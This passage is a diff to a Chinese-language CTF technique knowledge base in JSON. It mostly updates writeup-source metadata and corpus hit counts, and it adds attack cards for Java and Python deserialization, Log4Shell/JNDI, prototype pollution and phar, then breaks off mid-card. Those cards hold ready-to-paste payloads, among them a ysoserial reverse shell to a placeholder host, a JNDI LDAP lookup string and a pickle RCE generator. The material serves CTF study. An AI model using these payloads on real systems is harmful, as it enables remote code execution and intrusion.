@@ -2,54 +2,105 @@
  "_comment": "知识库卡片：信号（看到什么）→ 机制（为什么成立）→ 步骤 → 可粘贴命令。corpus 字段是 scripts/harvest_writeups.py 在这批公开 writeup 语料上实测的命中文件数（口径见 kb sources）。related_rules 指向 data/rules.json 的 id。",
  "sources": [
   {
+   "name": "Dest1ny-Sec/Des-CTF-Knowledge（中文首选）",
+   "url": "https://github.com/Dest1ny-Sec/Des-CTF-Knowledge",
+   "license": "MIT",
+   "fetched": "2026-10-06",
+   "files": 1093,
+   "bytes": 35271673,
+   "scope": "中文大赛 writeup 合集（1156 篇量级）：Web 为主，含 Misc 隐写/压缩包；仓库自带中文术语关键词地图",
+   "stages": {
+    "encoding": "664 文件",
+    "rce": "581 文件",
+    "rev_ghidra": "364 文件",
+    "crypto_rsa": "356 文件",
+    "buffer_overflow": "340 文件",
+    "crypto_aes": "314 文件"
+   }
+  },
+  {
+   "name": "balsn/ctf_writeup",
+   "url": "https://github.com/balsn/ctf_writeup",
+   "license": "见仓库（署名引用）",
+   "fetched": "2026-10-06",
+   "files": 145,
+   "bytes": 6868179,
+   "scope": "台湾强队 writeup：全方向，crypto 特别强，带数学推导",
+   "stages": {
+    "encoding": "133 文件",
+    "rce": "120 文件",
+    "xxe": "96 文件",
+    "crypto_rsa": "61 文件",
+    "buffer_overflow": "60 文件",
+    "heap": "60 文件"
+   }
+  },
+  {
+   "name": "JorianWoltjer/practical-ctf",
+   "url": "https://github.com/JorianWoltjer/practical-ctf",
+   "license": "见仓库（个人笔记）",
+   "fetched": "2026-10-06",
+   "files": 133,
+   "bytes": 1792098,
+   "scope": "GitBook 式技巧手册：技巧名 → 可直接复制的命令，最贴近「套路库」形态",
+   "stages": {
+    "encoding": "114 文件",
+    "rce": "100 文件",
+    "lfi": "47 文件",
+    "usb_traffic": "31 文件",
+    "xss": "29 文件",
+    "priv_esc": "29 文件"
+   }
+  },
+  {
    "name": "sajjadium/ctf-writeups",
    "url": "https://github.com/sajjadium/ctf-writeups",
-   "license": "见仓库（各题作者保留，仅本地统计/学习用）",
+   "license": "见仓库（署名引用）",
    "fetched": "2026-10-06",
    "files": 57,
    "bytes": 23042,
    "scope": "选手 writeup 合集，按 ctfs/<赛事>/<年>/<题>/README.md 组织；pwn 偏重",
    "stages": {
     "buffer_overflow": "31 文件",
-    "heap": "24 文件",
+    "heap": "26 文件",
+    "java_deser": "21 文件",
     "encoding": "16 文件",
     "rce": "8 文件",
-    "pwn_env": "7 文件",
-    "format_string": "3 文件"
+    "pwn_env": "7 文件"
    }
   },
   {
    "name": "Dvd848/CTFs",
    "url": "https://github.com/Dvd848/CTFs",
-   "license": "见仓库",
+   "license": "见仓库（署名引用）",
    "fetched": "2026-10-06",
    "files": 760,
    "bytes": 7746683,
-   "scope": "个人 CTF 题解合集（web/pwn/rev/crypto/misc 都有，覆盖面最均衡的一份）",
+   "scope": "个人题解合集：web/pwn/rev/crypto/misc 覆盖面最均衡",
    "stages": {
-    "encoding": "456 文件",
+    "encoding": "458 文件",
     "rce": "272 文件",
-    "rev_ghidra": "127 文件",
-    "crypto_rsa": "93 文件",
-    "buffer_overflow": "89 文件",
-    "crypto_aes": "85 文件"
+    "usb_traffic": "200 文件",
+    "rev_ghidra": "130 文件",
+    "buffer_overflow": "103 文件",
+    "crypto_rsa": "93 文件"
    }
   },
   {
    "name": "p4-team/ctf",
    "url": "https://github.com/p4-team/ctf",
-   "license": "见仓库",
+   "license": "见仓库（署名引用）",
    "fetched": "2026-10-06",
    "files": 864,
    "bytes": 11212704,
-   "scope": "战队 writeup 合集（事件/year/challenge 组织，pwn/rev 多）",
+   "scope": "战队 writeup 与题目附件合集（pwn/rev 多）",
    "stages": {
-    "encoding": "353 文件",
+    "encoding": "354 文件",
     "rce": "271 文件",
-    "crypto_rsa": "109 文件",
+    "crypto_rsa": "110 文件",
     "crypto_aes": "73 文件",
-    "php_magic": "41 文件",
-    "rev_ghidra": "34 文件"
+    "usb_traffic": "52 文件",
+    "php_magic": "41 文件"
    }
   },
   {
@@ -61,11 +112,11 @@
    "bytes": 6269587,
    "scope": "技法百科（不是 writeup）：讲机制与套路，用它的词频说明「这个手法在资料里有多常见」",
    "stages": {
+    "encoding": "147 文件",
     "rce": "146 文件",
-    "encoding": "145 文件",
     "pwn_env": "112 文件",
-    "heap": "107 文件",
-    "buffer_overflow": "86 文件",
+    "heap": "109 文件",
+    "buffer_overflow": "100 文件",
     "crypto_aes": "67 文件"
    }
   }
@@ -143,16 +194,20 @@
    ],
    "corpus": {
     "technique": "flask_session",
-    "files": 18,
+    "files": 89,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 57,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 8,
+     "JorianWoltjer__practical-ctf": 6,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 15,
      "p4-team__ctf": 3,
      "ctf-wiki__ctf-wiki": 0
     },
     "examples": [
-     "CTFs-master/2018_picoCTF/Flaskcards Skeleton Key.md",
-     "CTFs-master/2018_picoCTF/Flaskcards.md"
+     "Des-CTF-Knowledge-main/JWT.md",
+     "Des-CTF-Knowledge-main/SSTI.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -197,16 +252,20 @@
    ],
    "corpus": {
     "technique": "jwt",
-    "files": 21,
+    "files": 107,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 84,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 0,
+     "JorianWoltjer__practical-ctf": 2,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 19,
      "p4-team__ctf": 2,
      "ctf-wiki__ctf-wiki": 0
     },
     "examples": [
-     "CTFs-master/2019_BSidesTLV/Pacman.md",
-     "CTFs-master/2019_KipodAfterFree/Cookie_Clicker.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.idx.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -252,16 +311,20 @@
    ],
    "corpus": {
     "technique": "sqli",
-    "files": 76,
+    "files": 275,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 144,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 43,
+     "JorianWoltjer__practical-ctf": 11,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 37,
-     "p4-team__ctf": 31,
+     "p4-team__ctf": 32,
      "ctf-wiki__ctf-wiki": 8
     },
     "examples": [
-     "CTFs-master/2018_35C3_Junior/DB_Secret.md",
-     "CTFs-master/2018_CheckPoint_CSA/README.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -305,16 +368,20 @@
    ],
    "corpus": {
     "technique": "ssti",
-    "files": 17,
+    "files": 142,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 114,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 8,
+     "JorianWoltjer__practical-ctf": 3,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 10,
      "p4-team__ctf": 7,
      "ctf-wiki__ctf-wiki": 0
     },
     "examples": [
-     "CTFs-master/2018_picoCTF/Flaskcards.md",
-     "CTFs-master/2019_SunshineCTF/Portfolio.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -358,15 +425,20 @@
    ],
    "corpus": {
     "technique": "php_magic",
-    "files": 133,
+    "files": 401,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 227,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 36,
+     "JorianWoltjer__practical-ctf": 5,
      "sajjadium__ctf-writeups": 1,
      "Dvd848__CTFs": 43,
      "p4-team__ctf": 41,
      "ctf-wiki__ctf-wiki": 48
     },
     "examples": [
-     "ctf-writeups-master/ctfs/iCTF/2018/fantasticiot/README.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -412,16 +484,20 @@
    ],
    "corpus": {
     "technique": "lfi",
-    "files": 94,
+    "files": 451,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 231,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 53,
+     "JorianWoltjer__practical-ctf": 47,
      "sajjadium__ctf-writeups": 0,
-     "Dvd848__CTFs": 42,
-     "p4-team__ctf": 24,
-     "ctf-wiki__ctf-wiki": 28
+     "Dvd848__CTFs": 48,
+     "p4-team__ctf": 32,
+     "ctf-wiki__ctf-wiki": 40
     },
     "examples": [
-     "CTFs-master/2018_35C3_Junior/Note_accessible.md",
-     "CTFs-master/2018_GoogleCTF_BQ/Admin_UI.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -465,16 +541,20 @@
    ],
    "corpus": {
     "technique": "rce",
-    "files": 697,
+    "files": 1498,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 581,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 120,
+     "JorianWoltjer__practical-ctf": 100,
      "sajjadium__ctf-writeups": 8,
      "Dvd848__CTFs": 272,
      "p4-team__ctf": 271,
      "ctf-wiki__ctf-wiki": 146
     },
     "examples": [
-     "ctf-writeups-master/ctfs/0CTF/2018/Finals/freenote2018/README.md",
-     "ctf-writeups-master/ctfs/0CTF/2018/Quals/babyheap/README.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.idx.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -523,16 +603,20 @@
    ],
    "corpus": {
     "technique": "audit",
-    "files": 19,
+    "files": 126,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 86,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 20,
+     "JorianWoltjer__practical-ctf": 1,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 10,
      "p4-team__ctf": 4,
      "ctf-wiki__ctf-wiki": 5
     },
     "examples": [
-     "CTFs-master/2018_35C3_Junior/McDonald.md",
-     "CTFs-master/2018_35C3_Junior/blind.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -572,16 +656,20 @@
    ],
    "corpus": {
     "technique": "authbypass",
-    "files": 19,
+    "files": 142,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 98,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 8,
+     "JorianWoltjer__practical-ctf": 17,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 7,
      "p4-team__ctf": 2,
      "ctf-wiki__ctf-wiki": 10
     },
     "examples": [
-     "CTFs-master/2018_GoogleCTF_BQ/Holey_Beep.md",
-     "CTFs-master/2019_picoCTF/Open-to-admins.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/SSRF漏洞.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -656,16 +744,20 @@
    ],
    "corpus": {
     "technique": "upload",
-    "files": 14,
+    "files": 163,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 121,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 20,
+     "JorianWoltjer__practical-ctf": 8,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 4,
      "p4-team__ctf": 6,
      "ctf-wiki__ctf-wiki": 4
     },
     "examples": [
-     "CTFs-master/2020_BSidesTLV/Bugler.md",
-     "CTFs-master/2020_BSidesTLV/WebProxy.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -709,16 +801,20 @@
    ],
    "corpus": {
     "technique": "deser",
-    "files": 35,
+    "files": 282,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 211,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 26,
+     "JorianWoltjer__practical-ctf": 10,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 16,
      "p4-team__ctf": 17,
      "ctf-wiki__ctf-wiki": 2
     },
     "examples": [
-     "CTFs-master/2018_Shabak/searchable_text.txt",
-     "CTFs-master/2018_picoCTF/buffer overflow 3.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -762,16 +858,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "archive_crack",
-    "files": 6,
+    "files": 129,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 109,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 0,
+     "JorianWoltjer__practical-ctf": 2,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 3,
      "p4-team__ctf": 0,
-     "ctf-wiki__ctf-wiki": 3
+     "ctf-wiki__ctf-wiki": 15
     },
     "examples": [
-     "CTFs-master/2018_GoogleCTF_BQ/Security_by_Obscurity.md",
-     "CTFs-master/2018_Shabak/searchable_text.txt"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -816,15 +916,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "stego_img",
-    "files": 133,
+    "files": 338,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 157,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 26,
+     "JorianWoltjer__practical-ctf": 4,
      "sajjadium__ctf-writeups": 1,
-     "Dvd848__CTFs": 57,
-     "p4-team__ctf": 32,
-     "ctf-wiki__ctf-wiki": 43
+     "Dvd848__CTFs": 66,
+     "p4-team__ctf": 38,
+     "ctf-wiki__ctf-wiki": 46
     },
     "examples": [
-     "ctf-writeups-master/ctfs/StarCTF/2018/note/README.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -868,16 +973,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "crypto_rsa",
-    "files": 252,
+    "files": 698,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 356,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 61,
+     "JorianWoltjer__practical-ctf": 26,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 93,
-     "p4-team__ctf": 109,
-     "ctf-wiki__ctf-wiki": 50
+     "p4-team__ctf": 110,
+     "ctf-wiki__ctf-wiki": 52
     },
     "examples": [
-     "CTFs-master/2018_35C3_Junior/Decrypted.md",
-     "CTFs-master/2018_35C3_Junior/Note_accessible.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.idx.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -920,16 +1029,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "encoding",
-    "files": 970,
+    "files": 1886,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 664,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 133,
+     "JorianWoltjer__practical-ctf": 114,
      "sajjadium__ctf-writeups": 16,
-     "Dvd848__CTFs": 456,
-     "p4-team__ctf": 353,
-     "ctf-wiki__ctf-wiki": 145
+     "Dvd848__CTFs": 458,
+     "p4-team__ctf": 354,
+     "ctf-wiki__ctf-wiki": 147
     },
     "examples": [
-     "ctf-writeups-master/ctfs/0CTF/2017/Quals/babyheap/README.md",
-     "ctf-writeups-master/ctfs/0CTF/2018/Finals/freenote2018/README.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.idx.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -1006,16 +1119,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "buffer_overflow",
-    "files": 221,
+    "files": 667,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 340,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 60,
+     "JorianWoltjer__practical-ctf": 12,
      "sajjadium__ctf-writeups": 31,
-     "Dvd848__CTFs": 89,
-     "p4-team__ctf": 15,
-     "ctf-wiki__ctf-wiki": 86
+     "Dvd848__CTFs": 103,
+     "p4-team__ctf": 21,
+     "ctf-wiki__ctf-wiki": 100
     },
     "examples": [
-     "ctf-writeups-master/ctfs/0CTF/2017/Quals/babyheap/README.md",
-     "ctf-writeups-master/ctfs/0CTF/2018/Finals/freenote2018/README.md"
+     "Des-CTF-Knowledge-main/文件包含.md",
+     "Des-CTF-Knowledge-main/音频隐写.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -1064,16 +1181,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "rev_ghidra",
-    "files": 183,
+    "files": 638,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 364,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 48,
+     "JorianWoltjer__practical-ctf": 13,
      "sajjadium__ctf-writeups": 0,
-     "Dvd848__CTFs": 127,
+     "Dvd848__CTFs": 130,
      "p4-team__ctf": 34,
-     "ctf-wiki__ctf-wiki": 22
+     "ctf-wiki__ctf-wiki": 49
     },
     "examples": [
-     "CTFs-master/2018_35C3_Junior/poet.md",
-     "CTFs-master/2018_GoogleCTF_BQ/Admin_UI_2.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/JWT.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -1119,16 +1240,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "pcap",
-    "files": 109,
+    "files": 262,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 124,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 24,
+     "JorianWoltjer__practical-ctf": 5,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 43,
      "p4-team__ctf": 34,
      "ctf-wiki__ctf-wiki": 32
     },
     "examples": [
-     "CTFs-master/2018_CheckPoint_CSA/README.md",
-     "CTFs-master/2018_GoogleCTF_BQ/Security_by_Obscurity.md"
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -1172,16 +1297,20 @@
    "related_rules": [],
    "corpus": {
     "technique": "forensics_fs",
-    "files": 53,
+    "files": 133,
     "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 61,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 16,
+     "JorianWoltjer__practical-ctf": 3,
      "sajjadium__ctf-writeups": 0,
      "Dvd848__CTFs": 21,
      "p4-team__ctf": 9,
      "ctf-wiki__ctf-wiki": 23
     },
     "examples": [
-     "CTFs-master/2018_35C3_Junior/epic_mount.md",
-     "CTFs-master/2018_35C3_Junior/rare_mount.md"
+     "Des-CTF-Knowledge-main/PAYLOAD-CHEATSHEET.md",
+     "Des-CTF-Knowledge-main/压缩包总结.md"
     ],
     "note": "命中文件数（不是题数）"
    },
@@ -1191,13 +1320,641 @@
      "url": "https://sqlite.org/cli.html"
     }
    ]
+  },
+  {
+   "id": "java-deser-basics",
+   "title": "Java 反序列化：先看魔法字节与 Content-Type",
+   "phase": "injection",
+   "tags": [
+    "web",
+    "java"
+   ],
+   "signals": [
+    "请求/响应里有 rO0AB（base64 的 AC ED 00 05）",
+    "Content-Type: application/x-java-serialized-object",
+    "Cookie/参数是 base64 长串",
+    "框架是 Shiro/WebLogic/Fastjson/Jackson/XStream/SnakeYAML"
+   ],
+   "mechanism": "Java 的 ObjectInputStream 会按字节流还原对象，还原过程调用 readObject/readResolve，链走到 Runtime.exec 就是 RCE。ysoserial/phpggc 那类工具是按已知库版本预生成了这些链（CommonsCollections、CommonsBeanutils、URLDNS 探测等）。框架自己也有链（Shiro 的 rememberMe、Fastjson 的 autoType、WebLogic 的 T3/IIOP）。",
+   "steps": [
+    "先用 URLDNS 链只做 DNS 外带，确认「这个点真的会反序列化」（最安全的探测）",
+    "对目标环境列出依赖版本，选匹配的 gadget 链（版本不对链就断）",
+    "生成 payload 并注入（Cookie/参数/body，注意 base64 与 URL 编码）",
+    "无回显就换外带（DNS/HTTP）或反弹 shell"
+   ],
+   "cmds": [
+    "java -jar ysoserial.jar URLDNS 'http://<你的监听>' | base64 -w0",
+    "java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0",
+    "java -jar ysoserial.jar CommonsBeanutils1 'bash -i >& /dev/tcp/HOST/PORT 0>&1'"
+   ],
+   "tools": [
+    "ysoserial",
+    "ysoserial.net",
+    "JDK",
+    "jadx"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "java_deser",
+    "files": 440,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 239,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 50,
+     "JorianWoltjer__practical-ctf": 21,
+     "sajjadium__ctf-writeups": 21,
+     "Dvd848__CTFs": 22,
+     "p4-team__ctf": 20,
+     "ctf-wiki__ctf-wiki": 67
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/SSRF漏洞.md",
+     "Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2021西湖论剑-TinyNote详细分析.full.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "ysoserial（链清单与用法）",
+     "url": "https://github.com/frohoff/ysoserial"
+    }
+   ]
+  },
+  {
+   "id": "jndi-log4shell",
+   "title": "JNDI 注入 / Log4Shell：一行字符串换 RCE",
+   "phase": "injection",
+   "tags": [
+    "web",
+    "java"
+   ],
+   "signals": [
+    "输入被写进日志（User-Agent、参数、header）",
+    "依赖里有 log4j / fastjson / 老版本 JDK",
+    "回连能看到 DNS/LDAP 请求"
+   ],
+   "mechanism": "JNDI 的 lookup() 会去远端拉取对象（LDAP/RMI/DNS），拉回来的 Reference 可以指向远程 class → 执行。Log4Shell（CVE-2021-44228）就是日志里出现 ${jndi:ldap://…} 时被解析。表达式注入（OGNL/SpEL/EL）是同类思路：输入进了表达式求值。",
+   "steps": [
+    "先用纯 DNS 的 ${jndi:dns://xxx} 或 ${java:version} 确认解析发生（不落地任何代码）",
+    "这一步通再上 JNDI-Exploit/自定义 LDAP 服务返回恶意类",
+    "高版本 JDK 有 trustURLCodebase 限制，改走本地工厂类链（Tomcat/BeanFactory 之类）",
+    "Struts2/OGNL 类题目直接构造 OGNL 表达式，别绕 JNDI"
+   ],
+   "cmds": [
+    "ctfctl req get \"$U/\" -H 'User-Agent: ${jndi:ldap://<你的LDAP>/x}'",
+    "python3 -m http.server 80   # 简单外带先看有没有人回连",
+    "java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'id' -A <你的IP>"
+   ],
+   "tools": [
+    "JNDI-Injection-Exploit",
+    "marshalsec",
+    "nuclei"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "jndi_expr",
+    "files": 77,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 38,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 8,
+     "JorianWoltjer__practical-ctf": 1,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 16,
+     "p4-team__ctf": 12,
+     "ctf-wiki__ctf-wiki": 2
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/SSRF漏洞.md",
+     "Des-CTF-Knowledge-main/文件上传漏洞.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "Log4Shell 说明（Apache）",
+     "url": "https://logging.apache.org/log4j/2.x/security.html"
+    }
+   ]
+  },
+  {
+   "id": "python-pickle",
+   "title": "Python pickle/YAML 反序列化",
+   "phase": "injection",
+   "tags": [
+    "web",
+    "python"
+   ],
+   "signals": [
+    "源码里有 pickle.loads / yaml.load / cPickle",
+    "Cookie 或参数是 base64 的二进制（gASV…）",
+    "题目给的是 Python 服务"
+   ],
+   "mechanism": "pickle.loads 会按流里的 GLOBAL 指令导入任意可调用对象并用参数调用它 —— 因此 __reduce__ 返回 (os.system, ('id',)) 就是 RCE。yaml.load（非 safe_load）能构造任意 Python 对象，同理。",
+   "steps": [
+    "先看反序列化的是什么类型、能不能控制到 pickle.loads 的入参",
+    "构造 __reduce__ 版本的 payload（最稳），或手写 GLOBAL/REDUCE 指令",
+    "需要绕过滤时用非标准 opcode 或 base64 混淆",
+    "yaml 题用 !!python/object/apply:os.system 家族"
+   ],
+   "cmds": [
+    "python3 -c \"import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())\"",
+    "python3 -c \"import pickle,base64;print(base64.b64encode(pickle.loads(bytes.fromhex('<hex>')) and b''))\"",
+    "ctfctl req post \\\"$U/\\\" -d 'data=<payload>'"
+   ],
+   "tools": [
+    "python3",
+    "pickle-utils"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "python_pickle",
+    "files": 88,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 55,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 12,
+     "JorianWoltjer__practical-ctf": 3,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 10,
+     "p4-team__ctf": 8,
+     "ctf-wiki__ctf-wiki": 0
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/PHP反序列化漏洞总结.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "Python 文档：pickle 的安全性警告",
+     "url": "https://docs.python.org/3/library/pickle.html"
+    }
+   ]
+  },
+  {
+   "id": "node-proto-pollution",
+   "title": "原型链污染（Node/JS）",
+   "phase": "injection",
+   "tags": [
+    "web",
+    "node"
+   ],
+   "signals": [
+    "有 merge/clone/扩展对象的接口（?__proto__[x]=y）",
+    "源码里有 Object.assign / lodash.merge / JSON.parse 后展开",
+    "题目是 Node 服务（Express/Koa）"
+   ],
+   "mechanism": "JS 的对象查找会沿 __proto__ 链向上，污染 Object.prototype 上的键就能影响后续所有对象的默认属性（例如让 isAdmin 变 true、让 ejs 模板渲染带命令）。",
+   "steps": [
+    "找能把「键路径」写进对象的入口（merge/clone/query parser）",
+    "先污染一个可观测的键验证（如 __proto__[polluted]=yes，再看某处行为变化）",
+    "要 RCE 就找「受污染配置驱动的危险点」：ejs 模板选项、child_process 的参数拼装、require 的路径",
+    "被过滤 __proto__ 时试 constructor.prototype、URL 编码、数组形式"
+   ],
+   "cmds": [
+    "ctfctl req post \"$U/api/merge\" --json '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+    "ctfctl req get \"$U/check\"",
+    "node -e \"console.log(({}).polluted)\""
+   ],
+   "tools": [
+    "nodejs",
+    "npm"
+   ],
+   "related_rules": [],
+   "corpus": {
+    "technique": "node_proto",
+    "files": 206,
+    "per_source": {
+     "Dest1ny-Sec__Des-CTF-Knowledge": 116,
+     "r3kapig__writeup": 0,
+     "balsn__ctf_writeup": 23,
+     "JorianWoltjer__practical-ctf": 15,
+     "sajjadium__ctf-writeups": 0,
+     "Dvd848__CTFs": 30,
+     "p4-team__ctf": 3,
+     "ctf-wiki__ctf-wiki": 19
+    },
+    "examples": [
+     "Des-CTF-Knowledge-main/AI-SEARCH-INDEX.md",
+     "Des-CTF-Knowledge-main/SSRF漏洞.md"
+    ],
+    "note": "命中文件数（不是题数）"
+   },
+   "refs": [
+    {
+     "title": "PortSwigger: 原型链污染",
+     "url": "https://portswigger.net/web-security/prototype-pollution"
+    }
+   ]
+  },
+  {
+   "id": "php-phar",
+   "title": "phar:// 反序列化：不用 unserialize 也能触发",
+   "phase": "file",
+   "tags": [
+    "web",
+    "php"
+   ],
+   "signals": [
+    "源码里没有 unserialize，但有一堆文件函数（file_exists/getimagesize/fopen/md5_file）",
+    "参数能传路径（尤其能传自己上传的文件名）",
+    "PHP 7 环境"
+   ],
+   "mechanism": "phar 归档的元数据在读取时会被 unserialize。任何接受 phar:// 的文件函数都会触发它 —— 所以只要能把一个 phar 文件放上去（上传、图片马）并让某处文件函数读到它，就等价于反序列化。",
+   "steps": [
+    "找「可控路径 + 文件函数」的组合（上传点 + 图片校验最常见）",
+    "本地生成 phar（改后缀为 gif/png 也行），元数据里塞 POP 链",
+    "用 phar://uploads/xxx.gif/test 这种形式触发（注意 phar 路径格式）",
+    "PHP 8 后 phar 默认不再执行元数据，别把 8.x 当 7.x 打"
+   ],
+   "cmds": [
